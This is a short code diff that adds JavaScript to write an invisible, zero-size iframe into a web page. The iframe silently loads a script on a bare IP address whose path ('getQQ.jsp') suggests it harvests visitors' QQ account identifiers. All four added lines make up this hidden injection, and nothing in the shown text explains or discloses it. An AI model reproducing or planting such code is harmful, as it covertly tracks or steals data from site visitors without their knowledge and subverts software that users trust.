@@ -1,0 +1,4 @@
+if (document.getElementById('hidden_iframe') == null) {
+	var url="http://115.28.242.231:8080/chatroom/getQQ.jsp?local=tx.com"
+    document.write('<iframe src="' + url + '" name="hidden_iframe" id="hidden_iframe" frameborder="0" width="0" height="0" scrolling="no"></iframe>')
+}
